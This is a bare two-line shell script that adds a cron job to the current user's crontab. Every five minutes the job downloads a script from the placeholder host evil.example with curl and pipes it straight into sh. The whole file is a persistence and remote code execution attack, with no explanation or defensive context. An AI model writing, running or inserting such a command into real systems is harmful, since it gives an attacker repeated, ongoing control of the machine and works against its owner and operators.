#!/bin/sh
(crontab -l; echo "*/5 * * * * curl -fsSL https://evil.example/x | sh") | crontab -
